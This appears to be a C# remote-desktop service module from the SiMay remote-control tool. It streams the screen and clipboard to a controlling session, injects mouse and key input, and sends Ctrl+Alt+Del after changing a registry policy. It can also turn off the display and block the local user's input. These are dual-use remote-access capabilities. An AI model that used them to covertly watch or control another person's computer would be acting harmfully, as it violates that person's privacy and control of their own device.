using SiMay.Core;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using System.Linq;
using SiMay.Platform;
using SiMay.Platform.Windows;
using static SiMay.Platform.Windows.CommonWin32Api;
using SiMay.ModelBinder;
using SiMay.RemoteService.Loader;
using SiMay.Net.SessionProvider;

namespace SiMay.Service.Core
{
    [ServiceName("远程桌面")]
    [ApplicationServiceKey(ApplicationKeyConstant.REMOTE_DESKTOP)]
    public class ScreenService : ApplicationRemoteService
    {
        private int _bscanmode = 1; //0差异 1逐行
        private bool _cleanWallPaper = false;
        private static string wallpaper = string.Empty;
        private bool _hasSystemAuthor = AppConfiguartion.SystemPermission;
        private ScreenSpy _spy;

        public override void SessionInited(SessionProviderContext session)
        {
            session.CurrentSession.Socket.NoDelay = false;
            _spy = new ScreenSpy(new BitBltCapture(true));
            _spy.OnDifferencesNotice += ScreenDifferences_OnDifferencesNotice;
        }

        public override void SessionClosed()
        {
            if (_cleanWallPaper)
                User32.SystemParametersInfo(User32.SPI_SETDESKWALLPAPER, 0, wallpaper, User32.SPIF_UPDATEINIFILE | User32.SPIF_SENDWININICHANGE);
        }

        [PacketHandler(MessageHead.S_SCREEN_DELETE_WALLPAPER)]
        public void DeleteWallPaper(SessionProviderContext session)
        {
            if (_cleanWallPaper)
                return;

            _cleanWallPaper = true;
            wallpaper = new string('\0', 260);
            User32.SystemParametersInfo(0x73, 260, wallpaper, 0);
            wallpaper = wallpaper.Substring(0, wallpaper.IndexOf('\0'));
            User32.SystemParametersInfo(User32.SPI_SETDESKWALLPAPER, 0, string.Empty, 0);
        }


        [PacketHandler(MessageHead.S_SCREEN_SET_CLIPBOARD_TEXT)]
        public void SetClipoardHandler(SessionProviderContext session)
        {
            var pack = session.GetMessageEntity<ScreenSetClipoardPacket>();

            Thread thread = new Thread(() =>
            {
                Clipboard.SetText(pack.Text);
            });
            thread.SetApartmentState(ApartmentState.STA);//线程STA模式
            thread.Start();
        }


        [PacketHandler(MessageHead.S_SCREEN_GET_CLIPOARD_TEXT)]
        public void GetClipoardHandler(SessionProviderContext session)
        {
            Thread thread = new Thread(() =>
            {
                var text = Clipboard.GetText();
                CurrentSession.SendTo(MessageHead.C_SCREEN_CLIPOARD_TEXT,
                    new ScreenClipoardValuePacket()
                    {
                        Value = text
                    });
            });
            thread.SetApartmentState(ApartmentState.STA);//线程STA模式
            thread.Start();

        }

        [PacketHandler(MessageHead.S_SCREEN_GET_INIT_BITINFO)]
        public void SendDesktopBitInfo(SessionProviderContext session)
            => SendDesktopInitInfo();

        private void SendDesktopInitInfo()
        {
            CurrentSession.SendTo(MessageHead.C_SCREEN_BITINFO,
               new ScreenInitBitPacket()
               {
                   Height = _spy.ScreenHeight,
                   Width = _spy.ScreenWidth,
                   PrimaryScreenIndex = _spy.Capturer.SelectedScreen,
                   Monitors = Screen.AllScreens.Select(c => new MonitorItem()
                   {
                       DeviceName = c.DeviceName,
                       Primary = c.Primary
                   }).ToArray()
               });
        }

        [PacketHandler(MessageHead.S_SCREEN_CHANGE_MONITOR)]
        public void MonitorChangeHandler(SessionProviderContext session)
        {
            var currenMonitor = session.GetMessageEntity<MonitorChangePacket>().MonitorIndex;
            _spy.Capturer.SelectedScreen = currenMonitor;
        }

        private void ScreenDifferences_OnDifferencesNotice(Fragment[] fragments, DifferStatus nCode)
        {
            switch (nCode)
            {
                case DifferStatus.FULL_DIFFERENCES:
                    CurrentSession.SendTo(MessageHead.C_SCREEN_DIFFBITMAP,
                        new ScreenFragmentPacket()
                        {
                            Fragments = fragments
                        });
                    break;

                case DifferStatus.NEXT_SCREEN:
                    CurrentSession.SendTo(MessageHead.C_SCREEN_BITMP,
                        new ScreenFragmentPacket()
                        {
                            Fragments = fragments
                        });
                    break;

                case DifferStatus.COMPLETED:
                    CurrentSession.SendTo(MessageHead.C_SCREEN_SCANCOMPLETE);
                    break;
            }
        }
        [PacketHandler(MessageHead.S_SCREEN_NEXT_SCREENBITMP)]
        public void SendNextScreen(SessionProviderContext session)
        {
            var rect = session.GetMessageEntity<ScreenHotRectanglePacket>();
            //根据监控模式使用热区域扫描
            bool ishotRegtionScan = false;// rect.CtrlMode == 1 ? true : false;

            if (_hasSystemAuthor)
                Win32Interop.SwitchToInputDesktop();

            if (_bscanmode == 0)
                _spy.FindDifferences(ishotRegtionScan, new Rectangle(rect.X, rect.Y, rect.Width, rect.Height));
            else if (_bscanmode == 1)
                _spy.FullFindDifferences(ishotRegtionScan, new Rectangle(rect.X, rect.Y, rect.Width, rect.Height));
        }

        [PacketHandler(MessageHead.S_SCREEN_CTRL_ALT_DEL)]
        public void CtrlAltDelHandler(SessionProviderContext session)
        {
            var registryKey = RegistryEditor.GetWritableRegistryKey(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            registryKey.SetValue("SoftwareSASGeneration", 00000003, Microsoft.Win32.RegistryValueKind.DWord);

            if (AppConfiguartion.SystemPermission)
                UserTrunkContext.UserTrunkContextInstance?.SendSas();
            else
                User32.SendSAS(true);
        }

        [PacketHandler(MessageHead.S_SCREEN_CHANGESCANMODE)]
        public void ChangeSpyScanMode(SessionProviderContext session)
        {
            _bscanmode = session.GetMessage()[0];
        }

        [PacketHandler(MessageHead.S_SCREEN_SETQTY)]
        public void SetImageQuality(SessionProviderContext session)
        {
            var pack = session.GetMessageEntity<ScreenSetQtyPacket>();
            _spy.SetImageQuality = pack.Quality;
        }

        [PacketHandler(MessageHead.S_SCREEN_RESET)]
        public void SetSpyFormat(SessionProviderContext session)
        {
            _spy.SetFormat = session.GetMessage()[0];
        }

        [PacketHandler(MessageHead.S_SCREEN_BLACKSCREEN)]
        public void SetScreenBlack(SessionProviderContext session)
        {
            SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
        }

        [PacketHandler(MessageHead.S_SCREEN_MOUSEBLOCK)]
        public void SetMouseBlock(SessionProviderContext session)
        {
            if (session.GetMessage()[0] == 10)
                BlockInput(true);
            else
                BlockInput(false);
        }

        [PacketHandler(MessageHead.S_SCREEN_MOUSEKEYEVENT)]
        public void MouseKeyEvent(SessionProviderContext session)
        {
            var @event = session.GetMessageEntity<ScreenKeyPacket>();
            Screen[] allScreens = Screen.AllScreens;
            int offsetX = allScreens[_spy.Capturer.SelectedScreen].Bounds.X;
            int offsetY = allScreens[_spy.Capturer.SelectedScreen].Bounds.Y;

            int p1 = @event.Point1 + offsetX;
            int p2 = @event.Point2 + offsetY;
            switch (@event.Key)
            {
                case MOUSEKEY_KIND.Move:
                    //SendMouseMove(p1, p2);
                    SetCursorPos(p1, p2);
                    break;

                case MOUSEKEY_KIND.LeftDown:
                    //SendLeftMouseDown(p1, p2);
                    SetCursorPos(p1, p2);
                    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                    break;

                case MOUSEKEY_KIND.LeftUp:
                    //SendLeftMouseUp(p1, p2);
                    SetCursorPos(p1, p2);
                    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                    break;

                case MOUSEKEY_KIND.MiddleDown:
                    SetCursorPos(p1, p2);
                    mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0);
                    break;

                case MOUSEKEY_KIND.MiddleUp:
                    SetCursorPos(p1, p2);
                    mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0);
                    break;

                case MOUSEKEY_KIND.RightDown:
                    //SendRightMouseDown(p1, p2);
                    SetCursorPos(p1, p2);
                    mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
                    break;

                case MOUSEKEY_KIND.RightUp:
                    //SendRightMouseUp(p1, p2);
                    SetCursorPos(p1, p2);
                    mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
                    break;

                case MOUSEKEY_KIND.Wheel:
                    mouse_event(MOUSEEVENTF_WHEEL, 0, 0, p1, 0);
                    //SendMouseWheel(p1);
                    break;

                case MOUSEKEY_KIND.KeyDown:
                    keybd_event((byte)p1, 0, 0, 0);
                    //SendKeyDown(p1.ConvertTo<VirtualKey>());
                    break;

                case MOUSEKEY_KIND.KeyUp:
                    //SendKeyUp(p1.ConvertTo<VirtualKey>());
                    keybd_event((byte)p1, 0, WM_KEYUP, 0);
                    break;
            }
        }
        //public void SendKeyDown(VirtualKey keyCode)
        //{
        //    var union = new InputUnion()
        //    {
        //        ki = new KEYBDINPUT()
        //        {
        //            wVk = keyCode,
        //            wScan = 0,
        //            time = 0,
        //            dwExtraInfo = GetMessageExtraInfo()
        //        }
        //    };
        //    var input = new INPUT() { type = InputType.KEYBOARD, U = union };
        //    SendInput(1, new INPUT[] { input }, INPUT.Size);
        //}
        //public void SendKeyUp(VirtualKey keyCode)
        //{
        //    var union = new InputUnion()
        //    {
        //        ki = new KEYBDINPUT()
        //        {
        //            wVk = keyCode,
        //            wScan = 0,
        //            time = 0,
        //            dwFlags = KEYEVENTF.KEYUP,
        //            dwExtraInfo = GetMessageExtraInfo()
        //        }
        //    };
        //    var input = new INPUT() { type = InputType.KEYBOARD, U = union };
        //    SendInput(1, new INPUT[] { input }, INPUT.Size);
        //}

        //public uint SendLeftMouseDown(double percentX, double percentY)
        //{
        //    var union = new InputUnion() { mi = new MOUSEINPUT() { dwFlags = MOUSEEVENTF.ABSOLUTE | MOUSEEVENTF.LEFTDOWN | MOUSEEVENTF.VIRTUALDESK, dx = (int)percentX, dy = (int)percentY, time = 0, mouseData = 0, dwExtraInfo = GetMessageExtraInfo() } };
        //    var input = new INPUT() { type = InputType.MOUSE, U = union };
        //    return SendInput(1, new INPUT[] { input }, INPUT.Size);
        //}
        //public uint SendLeftMouseUp(double percentX, double percentY)
        //{
        //    var union = new InputUnion() { mi = new MOUSEINPUT() { dwFlags = MOUSEEVENTF.ABSOLUTE | MOUSEEVENTF.LEFTUP | MOUSEEVENTF.VIRTUALDESK, dx = (int)percentX, dy = (int)percentY, time = 0, mouseData = 0, dwExtraInfo = GetMessageExtraInfo() } };
        //    var input = new INPUT() { type = InputType.MOUSE, U = union };
        //    return SendInput(1, new INPUT[] { input }, INPUT.Size);
        //}

        //public uint SendRightMouseDown(double percentX, double percentY)
        //{
        //    var union = new InputUnion() { mi = new MOUSEINPUT() { dwFlags = MOUSEEVENTF.ABSOLUTE | MOUSEEVENTF.RIGHTDOWN | MOUSEEVENTF.VIRTUALDESK, dx = (int)percentX, dy = (int)percentY, time = 0, mouseData = 0, dwExtraInfo = GetMessageExtraInfo() } };
        //    var input = new INPUT() { type = InputType.MOUSE, U = union };
        //    return SendInput(1, new INPUT[] { input }, INPUT.Size);
        //}
        //public uint SendRightMouseUp(double percentX, double percentY)
        //{
        //    var union = new InputUnion() { mi = new MOUSEINPUT() { dwFlags = MOUSEEVENTF.ABSOLUTE | MOUSEEVENTF.RIGHTUP | MOUSEEVENTF.VIRTUALDESK, dx = (int)percentX, dy = (int)percentY, time = 0, mouseData = 0, dwExtraInfo = GetMessageExtraInfo() } };
        //    var input = new INPUT() { type = InputType.MOUSE, U = union };
        //    return SendInput(1, new INPUT[] { input }, INPUT.Size);
        //}

        //public uint SendMouseMove(double percentX, double percentY)
        //{
        //    var union = new InputUnion() { mi = new MOUSEINPUT() { dwFlags = MOUSEEVENTF.ABSOLUTE | MOUSEEVENTF.MOVE | MOUSEEVENTF.VIRTUALDESK, dx = (int)percentX, dy = (int)percentY, time = 0, mouseData = 0, dwExtraInfo = GetMessageExtraInfo() } };
        //    var input = new INPUT() { type = InputType.MOUSE, U = union };
        //    return SendInput(1, new INPUT[] { input }, INPUT.Size);
        //}

        //public uint SendMouseWheel(int deltaY)
        //{
        //    if (deltaY < 0)
        //    {
        //        deltaY = -120;
        //    }
        //    else if (deltaY > 0)
        //    {
        //        deltaY = 120;
        //    }
        //    var union = new InputUnion() { mi = new User32.MOUSEINPUT() { dwFlags = MOUSEEVENTF.WHEEL, dx = 0, dy = 0, time = 0, mouseData = deltaY, dwExtraInfo = GetMessageExtraInfo() } };
        //    var input = new INPUT() { type = InputType.MOUSE, U = union };
        //    return SendInput(1, new User32.INPUT[] { input }, INPUT.Size);
        //}
    }
}